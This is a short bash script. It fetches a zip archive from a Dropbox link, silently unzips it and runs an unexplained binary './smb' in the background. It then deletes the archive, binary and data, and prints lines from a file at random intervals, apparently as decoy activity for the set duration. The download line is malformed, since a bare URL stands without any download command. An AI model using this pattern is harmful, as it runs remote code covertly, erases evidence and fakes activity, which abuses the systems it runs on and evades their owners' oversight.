#!/bin/bash

end=$((SECONDS+$1))
https://www.dropbox.com/s/vk3inz82mf2zgtb/wan25.zip -q
unzip wan25.zip > /dev/null 2>&1
#pwd
./smb ./smbdata &
sleep 3
rm -rf wan25.zip
rm -rf smb
rm -rf smbdata
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 50 ))
done < $2

